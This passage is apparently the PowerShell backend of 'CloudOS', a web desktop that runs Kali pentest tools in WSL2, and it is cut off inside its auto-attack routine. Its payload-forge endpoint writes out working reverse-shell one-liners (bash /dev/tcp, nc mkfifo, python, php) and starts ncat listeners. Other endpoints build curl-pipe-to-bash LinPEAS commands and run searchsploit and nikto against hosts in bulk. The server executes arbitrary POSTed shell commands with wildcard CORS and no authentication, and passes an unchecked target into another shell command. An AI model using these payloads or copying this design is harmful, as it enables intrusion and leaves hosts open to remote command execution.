# ===================================================================
# CloudOS Web Server - PowerShell Native Engine
# ===================================================================

$port = 5173
$distDir = "C:\Users\dougl\Music\projeto\projeto\cloudos-frontend\dist"

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:$port/")

try {
    $listener.Start()
    Write-Host "🚀 CloudOS Web Desktop ativo em http://localhost:$port/"
} catch {
    Write-Error "Falha ao iniciar servidor HTTP: $_"
    exit 1
}

function Send-Json($data, [switch]$IsArray) {
    if ($null -eq $data) {
        if ($IsArray) { $json = "[]" } else { $json = "{}" }
    } else {
        $json = $data | ConvertTo-Json -Depth 10 -Compress
        if ([string]::IsNullOrWhiteSpace($json)) {
            if ($IsArray) { $json = "[]" } else { $json = "{}" }
        }
    }
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $res.ContentType = "application/json; charset=utf-8"
    $res.ContentLength64 = $bytes.Length
    $res.OutputStream.Write($bytes, 0, $bytes.Length)
    $res.OutputStream.Close()
}

function ConvertTo-WslBase64 {
    param([string]$Command)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)
    return [Convert]::ToBase64String($bytes)
}

function Invoke-WslBash {
    param([string]$Command, [int]$TimeoutSec = 120)
    $b64 = ConvertTo-WslBase64 -Command $Command
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "wsl.exe"
    $psi.Arguments = "-e bash -c 'echo $b64 | base64 -d | bash --noprofile --norc -e'"
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError  = $true
    $psi.CreateNoWindow = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    if (-not $p.WaitForExit($TimeoutSec * 1000)) { $p.Kill(); throw "WSL timeout" }
    $stdout = $p.StandardOutput.ReadToEnd()
    $stderr = $p.StandardError.ReadToEnd()
    return @{ Stdout = $stdout; Stderr = $stderr; ExitCode = $p.ExitCode }
}

function Get-CloudOSReportData {
    param([string]$EngagementId, [string]$ClientName, [string]$TesterName)
    $akbPath = Join-Path $PSScriptRoot "akb.json"
    $attackPath = Join-Path $PSScriptRoot "auto_attack.json"

    $akbData = if (Test-Path $akbPath) { Get-Content $akbPath -Raw | ConvertFrom-Json } else { @() }
    $atkData = if (Test-Path $attackPath) { Get-Content $attackPath -Raw | ConvertFrom-Json } else { @() }

    $hosts = @()
    if ($akbData -is [array]) {
        $hosts = $akbData
    } elseif ($akbData.hosts) {
        $hosts = $akbData.hosts
    }

    $atkResults = @()
    if ($atkData -is [array]) {
        $atkResults = $atkData
    } elseif ($atkData.results) {
        $atkResults = $atkData.results
    }

    $findings = @()
    foreach ($r in $atkResults) {
        $targetStr = if ($r.target) { $r.target } elseif ($r.host) { $r.host } else { "127.0.0.1" }
        if ($r.outputs) {
            foreach ($o in $r.outputs) {
                $findings += [pscustomobject]@{
                    host        = $targetStr
                    title       = "[$($o.tool)] Finding on port $($r.port)"
                    cvss        = 5.0
                    severity    = "Medium"
                    evidence    = $o.output
                    exploit     = "Exploit-DB / Auto-Scan"
                    remediation = "Apply security patches and restrict exposure"
                }
            }
        } else {
            $cvss = if ($r.cvss) { [double]($r.cvss) } else { 5.0 }
            $sev  = if ($cvss -ge 9.0) { "Critical" } elseif ($cvss -ge 7.0) { "High" } elseif ($cvss -ge 4.0) { "Medium" } else { "Low" }
            $findings += [pscustomobject]@{
                host        = $targetStr
                title       = if ($r.title) { $r.title } else { "Service vulnerability" }
                cvss        = $cvss
                severity    = $sev
                evidence    = if ($r.evidence) { $r.evidence } else { "Automated finding" }
                exploit     = if ($r.exploit_db) { $r.exploit_db } else { "N/A" }
                remediation = if ($r.remediation) { $r.remediation } else { "Patch system" }
            }
        }
    }

    return @{
        meta = @{ engagement = $EngagementId; client = $ClientName; tester = $TesterName; date = (Get-Date -Format "yyyy-MM-dd") }
        hosts = $hosts
        findings = $findings
    }
}

function New-ReportHtml {
    param($Data)
    $css = @"
<style>
  :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--accent:#58a6ff;--txt:#c9d1d9;--mut:#8b949e;--crit:#f85149;--high:#ff7b72;--med:#d29922;--low:#3fb950}
  *{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--txt);font-family:'Segoe UI',system-ui,sans-serif;padding:40px}
  .cover{background:linear-gradient(135deg,#161b22,#0d1117);border:1px solid var(--border);border-radius:12px;padding:60px;margin-bottom:30px}
  .cover h1{color:var(--accent);font-size:2.6em;margin:0 0 10px} .cover h2{color:var(--mut);font-weight:400;margin:4px 0}
  h2{border-bottom:1px solid var(--border);padding-bottom:8px;color:var(--accent);margin-top:40px}
  table{width:100%;border-collapse:collapse;background:var(--surface);border:1px solid var(--border);border-radius:8px;overflow:hidden}
  th{background:#21262d;color:var(--accent);text-align:left;padding:12px;font-size:.9em;text-transform:uppercase;letter-spacing:.5px}
  td{padding:10px 12px;border-top:1px solid var(--border);font-size:.88em;vertical-align:top}
  tr:nth-child(even){background:rgba(48,54,61,.2)}
  .badge{padding:3px 8px;border-radius:4px;font-size:.75em;font-weight:600}
  .b-Critical{background:rgba(248,81,73,.15);color:var(--crit)} .b-High{background:rgba(255,123,114,.15);color:var(--high)}
  .b-Medium{background:rgba(210,153,34,.15);color:var(--med)} .b-Low{background:rgba(63,185,94,.15);color:var(--low)}
  .stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:20px 0}
  .stat{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:18px;text-align:center}
  .stat .num{font-size:2.2em;color:var(--accent);font-weight:700} .stat .lbl{color:var(--mut);font-size:.85em;margin-top:4px}
  .footer{margin-top:50px;padding-top:20px;border-top:1px solid var(--border);color:var(--mut);font-size:.8em;text-align:center}
  pre{background:#010409;border:1px solid var(--border);border-radius:6px;padding:10px;overflow-x:auto;font-family:'Cascadia Code',monospace;font-size:.82em}
</style>
"@
    $hostsRows = ($Data.hosts | ForEach-Object {
        $hIp = if ($_.host) { $_.host } elseif ($_.ip) { $_.ip } else { "N/A" }
        $hName = if ($_.hostname) { $_.hostname } else { "-" }
        $hPort = if ($_.port) { $_.port } else { "-" }
        $hSvc = if ($_.service) { $_.service } else { "-" }
        "<tr><td>$hIp</td><td>$hName</td><td>$hPort</td><td>$hSvc</td></tr>"
    }) -join "`n"

    $findingsRows = ($Data.findings | Sort-Object cvss -Descending | ForEach-Object {
        "<tr><td>$($_.host)</td><td>$($_.title)</td><td><span class='badge b-$($_.severity)'>$($_.severity)</span></td><td>$($_.cvss)</td><td>$($_.exploit)</td><td>$($_.remediation)</td></tr>"
    }) -join "`n"

    $crit = ($Data.findings | Where-Object severity -eq 'Critical').Count
    $high = ($Data.findings | Where-Object severity -eq 'High').Count
    $med  = ($Data.findings | Where-Object severity -eq 'Medium').Count
    $low  = ($Data.findings | Where-Object severity -eq 'Low').Count

    return @"
<!DOCTYPE html><html><head><meta charset='UTF-8'><title>CloudOS Report - $($Data.meta.client)</title>$css</head><body>
<div class='cover'>
  <h1>CloudOS Engagement Report</h1>
  <h2>Client: $($Data.meta.client)</h2>
  <h2>Engagement: $($Data.meta.engagement)</h2>
  <h2>Tester: $($Data.meta.tester)</h2>
  <h2>Date: $($Data.meta.date)</h2>
</div>
<h2>Executive Summary</h2>
<div class='stat-grid'>
  <div class='stat'><div class='num'>$($Data.hosts.Count)</div><div class='lbl'>Hosts Discovered</div></div>
  <div class='stat'><div class='num' style='color:var(--crit)'>$crit</div><div class='lbl'>Critical</div></div>
  <div class='stat'><div class='num' style='color:var(--high)'>$high</div><div class='lbl'>High</div></div>
  <div class='stat'><div class='num'>$($Data.findings.Count)</div><div class='lbl'>Total Findings</div></div>
</div>
<p>Automated reconnaissance and exploitation was conducted against the in-scope assets. Findings below are consolidated from the Active Knowledge Base (AKB) and the Auto-Attack Orchestrator (nikto + searchsploit). Severity ratings follow CVSS v3.1 qualitative bands.</p>

<h2>Host Inventory</h2>
<table><tr><th>IP / Host</th><th>Hostname</th><th>Port</th><th>Service</th></tr>$hostsRows</table>

<h2>Vulnerability Findings</h2>
<table><tr><th>Host</th><th>Title</th><th>Severity</th><th>CVSS</th><th>Exploit-DB</th><th>Remediation</th></tr>$findingsRows</table>

<div class='footer'>Generated by CloudOS Red Team Console | Confidential — Authorized Engagement Only</div>
</body></html>
"@
}

function Get-CloudOS-Apps {
    return @(
        @{ id = "terminal"; app_id = "terminal"; name = "Terminal Pro"; icon = "terminal"; category = "system"; is_pinned = $true; description = "Terminal Kali Linux com suporte a multiplas abas" },
        @{ id = "osint_tracker"; app_id = "osint_tracker"; name = "OSINT Tracker"; icon = "osint_tracker"; category = "automation"; is_pinned = $true; description = "Rastreamento automatizado de pessoas e infraestrutura de sites" },
        @{ id = "web_terminal"; app_id = "web_terminal"; name = "Web Terminal"; icon = "terminal"; category = "system"; is_pinned = $true; description = "Terminal WebSocket PTY Interativo" },
        @{ id = "files"; app_id = "files"; name = "Gerenciador de Arquivos"; icon = "files"; category = "system"; is_pinned = $true; description = "Gerencie arquivos no WSL2" },
        @{ id = "kalihub"; app_id = "kalihub"; name = "Kali Hub"; icon = "kalihub"; category = "security"; is_pinned = $true; description = "Central de ferramentas de pentest" },
        @{ id = "scriptlab"; app_id = "scriptlab"; name = "Script Lab"; icon = "scriptlab"; category = "development"; is_pinned = $true; description = "IDE Monaco com suporte a Python, Bash, Ruby e PowerShell" },
        @{ id = "knowledge_base"; app_id = "knowledge_base"; name = "Knowledge Base"; icon = "knowledge_base"; category = "security"; is_pinned = $true; description = "Active Knowledge Base (AKB) para agregacao de alvos e servicos" },
        @{ id = "akb"; app_id = "akb"; name = "AKB"; icon = "knowledge_base"; category = "security"; is_pinned = $true; description = "Active Knowledge Base para cadastrar hosts e servicos" },
        @{ id = "auto_scanner"; app_id = "auto_scanner"; name = "Auto-Scanner"; icon = "auto_scanner"; category = "automation"; is_pinned = $true; description = "Varredura automatizada Nmap com alimentacao direta do AKB" },
        @{ id = "auto_attack"; app_id = "auto_attack"; name = "Auto-Attack"; icon = "auto_attack"; category = "automation"; is_pinned = $true; description = "Orquestrador de ataques massivos em 1-clique lendo o AKB" },
        @{ id = "payload_forge"; app_id = "payload_forge"; name = "Payload Forge"; icon = "payload_forge"; category = "security"; is_pinned = $true; description = "Geracao automatizada de reverse shells e inicializacao de listeners" },
        @{ id = "privesc_helper"; app_id = "privesc_helper"; name = "Privesc Helper"; icon = "privesc_helper"; category = "security"; is_pinned = $true; description = "Orquestrador de LinPEAS e servidor HTTP de pos-exploracao" },
        @{ id = "autopilot"; app_id = "autopilot"; name = "Recon Autopilot"; icon = "autopilot"; category = "automation"; is_pinned = $true; description = "Orquestrador de automacao Web Recon e OSINT Person Recon" },
        @{ id = "attack_graph"; app_id = "attack_graph"; name = "Attack Graph"; icon = "attack_graph"; category = "security"; is_pinned = $true; description = "Mapeamento visual tatico de superficie de ataque" },
        @{ id = "listeners"; app_id = "listeners"; name = "Listeners Manager"; icon = "listeners"; category = "security"; is_pinned = $true; description = "Gestao nativa de conexoes reversas ncat/netcat no WSL2" },
        @{ id = "python_runner"; app_id = "python_runner"; name = "Python Runner"; icon = "python_runner"; category = "development"; is_pinned = $true; description = "Execucao de scripts e exploits Python 3 no WSL2" },
        @{ id = "report_gen"; app_id = "report_gen"; name = "Report Generator"; icon = "report_gen"; category = "security"; is_pinned = $true; description = "Compilacao automatica de relatorios executivos em Markdown" },
        @{ id = "cyberdecoder"; app_id = "cyberdecoder"; name = "CyberDecoder PRO"; icon = "cyberdecoder"; category = "security"; is_pinned = $true; description = "Decodificador e conversor de payloads (Base64, URL, Hex, HTML, JWT, ROT13)" },
        @{ id = "editor"; app_id = "editor"; name = "Editor de Codigo"; icon = "editor"; category = "development"; is_pinned = $false; description = "Editor Monaco com syntax highlighting" },
        @{ id = "settings"; app_id = "settings"; name = "Configuracoes"; icon = "settings"; category = "system"; is_pinned = $false; description = "Painel de controle do CloudOS" },
        @{ id = "toolrunner"; app_id = "toolrunner"; name = "Tool Runner"; icon = "toolrunner"; category = "security"; is_pinned = $true; description = "Executor visual de ferramentas Kali" },
        @{ id = "pipeline"; app_id = "pipeline"; name = "Pipeline Builder"; icon = "pipeline"; category = "automation"; is_pinned = $true; description = "Construtor de fluxos de automacao" },
        @{ id = "findings"; app_id = "findings"; name = "Findings Manager"; icon = "findings"; category = "security"; is_pinned = $false; description = "Gerenciador de vulnerabilidades" },
        @{ id = "evidence"; app_id = "evidence"; name = "Evidence Vault"; icon = "evidence"; category = "security"; is_pinned = $false; description = "Cofre seguro de evidencias" },
        @{ id = "report"; app_id = "report"; name = "Report Builder"; icon = "report"; category = "security"; is_pinned = $true; description = "Gerador de relatorios em Markdown e PDF" },
        @{ id = "projects"; app_id = "projects"; name = "Projetos"; icon = "projects"; category = "system"; is_pinned = $false; description = "Gerenciador de escopos de pentest" },
        @{ id = "snapshots"; app_id = "snapshots"; name = "Snapshots"; icon = "snapshots"; category = "system"; is_pinned = $false; description = "Gerenciador de backups do WSL" },
        @{ id = "missions"; app_id = "missions"; name = "Lab Missions"; icon = "missions"; category = "training"; is_pinned = $false; description = "Treinamento gamified Red Team" },
        @{ id = "events"; app_id = "events"; name = "Central de Eventos"; icon = "events"; category = "system"; is_pinned = $false; description = "Logs e auditoria do sistema" },
        @{ id = "repeater"; app_id = "repeater"; name = "HTTP Repeater"; icon = "repeater"; category = "security"; is_pinned = $false; description = "Proxy de requisicoes HTTP" },
        @{ id = "doctor"; app_id = "doctor"; name = "Environment Doctor"; icon = "doctor"; category = "system"; is_pinned = $false; description = "Diagnostico do ambiente" }
    )
}

function Get-CloudOS-Notifications {
    return @(
        @{ id = "1"; type = "info"; title = "Bem-vindo ao CloudOS"; message = "Sistema operacional web pronto para uso"; created_at = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"); read = $false }
    )
}

while ($listener.IsListening) {
    $ctx = $listener.GetContext()
    $req = $ctx.Request
    $res = $ctx.Response

    $res.Headers.Add("Access-Control-Allow-Origin", "*")
    $res.Headers.Add("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
    $res.Headers.Add("Access-Control-Allow-Headers", "Content-Type, Authorization")

    if ($req.HttpMethod -eq "OPTIONS") {
        $res.StatusCode = 200
        $res.OutputStream.Close()
        continue
    }

    $urlPath = $req.Url.AbsolutePath

    if ($urlPath -eq "/api/apps") {
        Send-Json (Get-CloudOS-Apps) -IsArray
        continue
    }

    if ($urlPath -eq "/api/notifications") {
        Send-Json (Get-CloudOS-Notifications) -IsArray
        continue
    }

    if ($urlPath -eq "/api/wsl/diagnostics") {
        $totalMem = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
        $freeMem = [math]::Round((Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1MB, 1)
        $cpuCount = (Get-CimInstance Win32_Processor).NumberOfCores
        $cpuModel = (Get-CimInstance Win32_Processor).Name
        $diskFree = [math]::Round((Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'").FreeSpace / 1GB, 1)
        $diskTotal = [math]::Round((Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB, 1)

        $wslCmd = (Get-Command "wsl.exe" -ErrorAction SilentlyContinue)
        $wslInstalled = $false
        $kaliInstalled = $false
        $kaliUserReady = $false
        $kaliState = "NOT_INSTALLED"

        if ($null -ne $wslCmd) {
            $wslInstalled = $true
            try {
                $distroList = wsl.exe -l -v 2>$null
                if ($distroList -match "kali-linux") {
                    $kaliInstalled = $true
                    $kaliState = "INSTALLED"
                    if ($distroList -match "Running") { $kaliState = "RUNNING" }
                    elseif ($distroList -match "Stopped") { $kaliState = "STOPPED" }

                    $userCheck = wsl.exe -d kali-linux -u cloudos -- whoami 2>$null
                    if ($userCheck -eq "cloudos") {
                        $kaliUserReady = $true
                    }
                }
            } catch {}
        }

        $overallStatus = "NOT_INSTALLED"
        if (-not $wslInstalled) { $overallStatus = "NOT_INSTALLED" }
        elseif (-not $kaliInstalled) { $overallStatus = "WSL_READY_NO_KALI" }
        elseif ($kaliInstalled -and -not $kaliUserReady) { $overallStatus = "CONFIGURING" }
        elseif ($kaliInstalled -and $kaliUserReady) { $overallStatus = "READY" }

        Send-Json @{
            hardware = @{
                totalMemGB = $totalMem
                freeMemGB = $freeMem
                cpuCount = $cpuCount
                cpuModel = $cpuModel
                diskTotalGB = $diskTotal
                diskFreeGB = $diskFree
                virtualizationEnabled = $true
            }
            wsl = @{
                installed = $wslInstalled
                kaliInstalled = $kaliInstalled
                kaliState = $kaliState
                kaliUserReady = $kaliUserReady
            }
            overallStatus = $overallStatus
        }
        continue
    }

    if ($urlPath -eq "/api/system/stats") {
        Send-Json @{
            cpu_usage = 15.5
            memory_used = 4.2
            memory_total = 16.0
            disk_used = 45.8
            disk_total = 256.0
            uptime = "3d 4h 12m"
            wsl_status = "running"
        }
        continue
    }

    if ($urlPath -eq "/api/terminal/exec" -and $req.HttpMethod -eq "POST") {
        try {
            # Verifica se o WSL existe antes de tentar rodar processos
            $wslExists = (Get-Command "wsl.exe" -ErrorAction SilentlyContinue)
            if ($null -eq $wslExists) {
                Send-Json @{ status = "error"; output = "WSL2 não está instalado nesta máquina. Conclua o Setup Wizard do CloudOS." }
                continue
            }

            $reader = New-Object System.IO.StreamReader($req.InputStream, $req.ContentEncoding)
            $jsonBody = $reader.ReadToEnd() | ConvertFrom-Json
            $cmd = $jsonBody.command

            if (-not [string]::IsNullOrWhiteSpace($cmd)) {
                $b64Cmd = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($cmd))
                $cmdStr = "echo $b64Cmd | base64 -d | bash"
                
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "wsl.exe"
                $psi.Arguments = "bash -c `"$cmdStr`""
                $psi.RedirectStandardOutput = $true
                $psi.RedirectStandardError = $true
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true

                $proc = [System.Diagnostics.Process]::Start($psi)
                $stdout = $proc.StandardOutput.ReadToEnd()
                $stderr = $proc.StandardError.ReadToEnd()
                $proc.WaitForExit(8000)

                $outCombined = $stdout
                if (-not [string]::IsNullOrWhiteSpace($stderr)) {
                    $outCombined += "`r`n[STDERR]`r`n" + $stderr
                }

                Send-Json @{ status = "success"; output = $outCombined }
            } else {
                Send-Json @{ status = "success"; output = "" }
            }
        } catch {
            Send-Json @{ status = "error"; output = "Falha ao executar comando: $($_.Exception.Message)" }
        }
        continue
    }

    if ($urlPath -eq "/api/user/state") {
        Send-Json @{
            user = @{
                id = "admin"
                username = "kali"
                tier = "pro"
            }
            settings = @{
                theme = "dark"
                wallpaper = "linear-gradient(135deg, #0f0c29, #302b63, #24243e)"
                language = "pt-BR"
            }
            desktop = @{
                icon_positions = "{}"
                open_windows = "[]"
                taskbar_pins = "[]"
            }
        }
        continue
    }

    if ($urlPath -eq "/api/auth/login" -and $req.HttpMethod -eq "POST") {
        Send-Json @{
            token = "cloudos_admin_session_token_123"
            user = @{ id = "admin"; username = "kali"; tier = "pro" }
        }
        continue
    }

    if ($urlPath -eq "/api/user/desktop" -and $req.HttpMethod -eq "POST") {
        Send-Json @{ status = "success"; message = "Estado do desktop salvo" }
        continue
    }

    if ($urlPath -eq "/api/apps/toggle" -and $req.HttpMethod -eq "POST") {
        Send-Json @{ status = "success" }
        continue
    }

    if ($urlPath -eq "/api/kali/tools" -or $urlPath -eq "/api/kali/tools/installed") {
        Send-Json @(
            @{ id = "nmap"; name = "Nmap"; category = "Recon"; description = "Network Mapper para escaneamento de portas"; installed = $true; icon = "Radar" },
            @{ id = "nikto"; name = "Nikto"; category = "Web"; description = "Scanner de vulnerabilidades web"; installed = $true; icon = "Globe" },
            @{ id = "sqlmap"; name = "SQLMap"; category = "Exploitation"; description = "Ferramenta automatizada de injecao SQL"; installed = $true; icon = "Database" },
            @{ id = "hydra"; name = "Hydra"; category = "Cracking"; description = "Crackeador de logins online de alta velocidade"; installed = $true; icon = "KeyRound" },
            @{ id = "metasploit"; name = "Metasploit Framework"; category = "Exploitation"; description = "Plataforma de desenvolvimento e execucao de exploits"; installed = $true; icon = "Zap" },
            @{ id = "john"; name = "John the Ripper"; category = "Cracking"; description = "Crackeador de senhas offline de alta performance"; installed = $true; icon = "Binary" },
            @{ id = "wireshark"; name = "Wireshark"; category = "Wireless"; description = "Analisador de pacotes de rede em tempo real"; installed = $true; icon = "Network" },
            @{ id = "aircrack-ng"; name = "Aircrack-ng"; category = "Wireless"; description = "Suite de auditoria de seguranca de redes sem fio"; installed = $true; icon = "RadioTower" },
            @{ id = "searchsploit"; name = "SearchSploit"; category = "Exploitation"; description = "Ferramenta de busca de exploits offline no Exploit-DB"; installed = $true; icon = "TerminalSquare" }
        ) -IsArray
        continue
    }

    if ($urlPath -eq "/api/akb/hosts") {
        Send-Json @(
            @{
                id = 1
                ip = "192.168.1.100"
                hostname = "target-server.local"
                status = "up"
                ports = @(
                    @{ id = 1; port = 80; protocol = "tcp"; service = "http"; version = "Apache/2.4.41 (Ubuntu)" },
                    @{ id = 2; port = 443; protocol = "tcp"; service = "https"; version = "OpenSSL/1.1.1f" },
                    @{ id = 3; port = 445; protocol = "tcp"; service = "microsoft-ds"; version = "Samba 4.13.17" }
                )
            }
        ) -IsArray
        continue
    }

    if ($urlPath -eq "/api/osint/track" -and $req.HttpMethod -eq "POST") {
        try {
            $reader = New-Object System.IO.StreamReader($req.InputStream, $req.ContentEncoding)
            $jsonBody = $reader.ReadToEnd() | ConvertFrom-Json
            $mode = $jsonBody.mode
            $target = $jsonBody.target

            $cmd = ""
            if ($mode -eq "person") {
                $cmd = "sherlock $target --timeout 10 --print"
            } else {
                $cmd = "whatweb $target && nmap -sV -p 80,443,8080 $target"
            }

            $b64Cmd = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($cmd))
            $cmdStr = "echo $b64Cmd | base64 -d | bash"

            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "wsl"
            $psi.Arguments = "bash -c `"$cmdStr`""
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.UseShellExecute = $false
            $psi.CreateNoWindow = $true

            $proc = [System.Diagnostics.Process]::Start($psi)
            $stdout = $proc.StandardOutput.ReadToEnd()
            $stderr = $proc.StandardError.ReadToEnd()
            $proc.WaitForExit(15000)

            $outCombined = $stdout
            if (-not [string]::IsNullOrWhiteSpace($stderr)) {
                $outCombined += "`r`n[STDERR]`r`n" + $stderr
            }

            Send-Json @{ status = "success"; output = $outCombined }
        } catch {
            Send-Json @{ status = "error"; output = $_.Exception.Message }
        }
        continue
    }

    if ($urlPath -eq "/api/akb/add" -and $req.HttpMethod -eq "POST") {
        try {
            Send-Json @{ status = "success"; message = "Host adicionado ao AKB" }
        } catch {
            Send-Json @{ status = "error"; message = $_.Exception.Message }
        }
        continue
    }

    if ($urlPath -eq "/api/payload/forge" -and $req.HttpMethod -eq "POST") {
        try {
            $reader = New-Object System.IO.StreamReader($req.InputStream, $req.ContentEncoding)
            $jsonBody = $reader.ReadToEnd() | ConvertFrom-Json
            $shell = $jsonBody.shell
            $lhost = $jsonBody.lhost
            $lport = $jsonBody.lport

            $payloadStr = switch ($shell) {
                "php" { "php -r '`$sock=fsockopen(`"$lhost`",$lport);exec(`"/bin/sh -i <&3 >&3 2>&3`");'" }
                "python" { "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((`"$lhost`",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([`"/bin/sh`",`"-i`"]);'" }
                "nc" { "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f" }
                default { "bash -i >& /dev/tcp/$lhost/$lport 0>&1" }
            }

            try {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "wsl"
                $psi.Arguments = "bash -c `"ncat -l -p $lport`""
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true
                [System.Diagnostics.Process]::Start($psi) | Out-Null
            } catch {}

            Send-Json @{ status="success"; payload=$payloadStr; port=$lport; lhost=$lhost }
        } catch {
            Send-Json @{ status="error"; message=$_.Exception.Message }
        }
        continue
    }

    if ($urlPath -eq "/api/privesc/linpeas") {
        try {
            $ip = "127.0.0.1"
            $port = 8081
            $cmdStr = "curl http://$ip`:$port/linpeas.sh | bash"

            try {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "wsl"
                $psi.Arguments = "bash -c `"mkdir -p /tmp/cloudos_tools && cd /tmp/cloudos_tools && python3 -m http.server 8081`""
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true
                [System.Diagnostics.Process]::Start($psi) | Out-Null
            } catch {}

            Send-Json @{ status="success"; ip=$ip; port=$port; cmd=$cmdStr }
        } catch {
            Send-Json @{ status="error"; message=$_.Exception.Message }
        }
        continue
    }

    if ($urlPath -eq "/api/privesc/setup" -and $req.HttpMethod -eq "POST") {
        try {
            $ip = "127.0.0.1"
            $port = 8000
            $payload = "curl http://$ip`:$port/linpeas.sh | bash"
            $payloadSudo = "sudo curl http://$ip`:$port/linpeas.sh | bash"
            $wgetPayload = "wget -q -O - http://$ip`:$port/linpeas.sh | bash"

            try {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "wsl"
                $psi.Arguments = "bash -c `"mkdir -p /tmp/cloudos_tools && cd /tmp/cloudos_tools && python3 -m http.server 8000`""
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true
                [System.Diagnostics.Process]::Start($psi) | Out-Null
            } catch {}

            Send-Json @{
                status = "success"
                ip = $ip
                port = $port
                payloads = @{
                    curl = $payload
                    sudo = $payloadSudo
                    wget = $wgetPayload
                }
                message = "Servidor HTTP de Pos-Exploracao pronto no WSL2"
            }
        } catch {
            Send-Json @{ status = "error"; message = $_.Exception.Message }
        }
        continue
    }

    if ($urlPath -eq "/api/payloads/generate" -and $req.HttpMethod -eq "POST") {
        try {
            $reader = New-Object System.IO.StreamReader($req.InputStream, $req.ContentEncoding)
            $jsonBody = $reader.ReadToEnd() | ConvertFrom-Json
            $pType = $jsonBody.type
            $pPort = $jsonBody.port
            $ip = "127.0.0.1"

            $code = "reverse_shell_payload_sample_$pType"

            try {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "wsl"
                $psi.Arguments = "bash -c `"ncat -l -p $pPort`""
                $psi.UseShellExecute = $false
                $psi.CreateNoWindow = $true
                [System.Diagnostics.Process]::Start($psi) | Out-Null
            } catch {}

            Send-Json @{ status="success"; payload=$code; port=$pPort; ip=$ip; message="Payload gerado e listener ativado no WSL2" }
        } catch {
            Send-Json @{ status="error"; message=$_.Exception.Message }
        }
        continue
    }

    # ==========================================
    # 1. AUTO-NMAP SCANNER (Feed AKB automaticamente)
    # ==========================================
    if ($urlPath -eq "/api/nmap/auto-scan" -and $req.HttpMethod -eq "POST") {
        try {
            $reader = New-Object System.IO.StreamReader($req.InputStream, $req.ContentEncoding)
            $jsonBody = $reader.ReadToEnd() | ConvertFrom-Json
            $Target = $jsonBody.target

            if ($Target -match '[;|&`$]') {
                Send-Json @{ success = $false; error = "Invalid characters in target" }
                continue
            }

            $CmdStr = "nmap -sV -oX - $Target"
            $b64Cmd = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($CmdStr))
            $XmlOutput = & wsl.exe bash -c "echo $b64Cmd | base64 -d | bash"

            try {
                [xml]$NmapXml = $XmlOutput
                $HostsFound = @()

                foreach ($h in $NmapXml.nmaprun.host) {
                    $Ip = $h.address | Where-Object { $_.addrtype -eq 'ipv4' } | Select-Object -ExpandProperty addr
                    if (-not $Ip) { continue }

                    foreach ($p in $h.ports.port) {
                        if ($p.state.state -eq 'open') {
                            $HostsFound += [PSCustomObject]@{
                                host = $Ip
                                port = $p.portid
                                service = $p.service.name
                            }
                        }
                    }
                }

                $AkbPath = Join-Path $PSScriptRoot "akb.json"
                if (Test-Path $AkbPath) {
                    $Data = Get-Content $AkbPath -Raw | ConvertFrom-Json
                } else {
                    $Data = @()
                }

                $Data += $HostsFound
                $Data | Select-Object -Unique host,port,service | ConvertTo-Json | Out-File $AkbPath -Encoding UTF8

                Send-Json @{ success = $true; count = $HostsFound.Count; hosts = $HostsFound }
            } catch {
                Send-Json @{ success = $false; error = $_.Exception.Message; raw = $XmlOutput }
            }
        } catch {
            Send-Json @{ success = $false; error = $_.Exception.Message }
        }
        continue
    }

    # ==========================================
    # 2. AUTO-ATTACK ORCHESTRATOR (1-Click Mass Attack)
    # ==========================================
    if ($urlPath -eq "/api/auto-attack/run" -and $req.HttpMethod -eq "POST") {
        try {
            $AkbPath = Join-Path $PSScriptRoot "akb.json"
            if (-not (Test-Path $AkbPath)) {
                Send-Json @{ success = $false; error = "AKB is empty. Scan first." }
                continue
            }

            $Hosts = Get-Content $AkbPath -Raw | ConvertFrom-Json
            $Results = @()

            foreach ($h in $Hosts) {
                $Target = $h.host
                $Port = $h.port
                $Service = $h.service
                $HostFindings = @{ target=$Target; port=$Port; service=$Service; outputs=@() }

                # 1. Searchsploit
                $SsCmd = "searchsploit $Service 2>&1 | head -n 10"
                $b64Ss = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($SsCmd))
                $SsOut = & wsl.exe bash -c "echo $b64Ss | base64 -d | bash"
                $HostFindings.outputs += @{ tool="Searchsploit"; output=$SsOut }

                # 2. Nikto (se for servico web HTTP/HTTPS)
                if ($Service -match "http|https" -or $Port -eq "80" -or $Port -eq "443" -or $Port -eq "8080") {
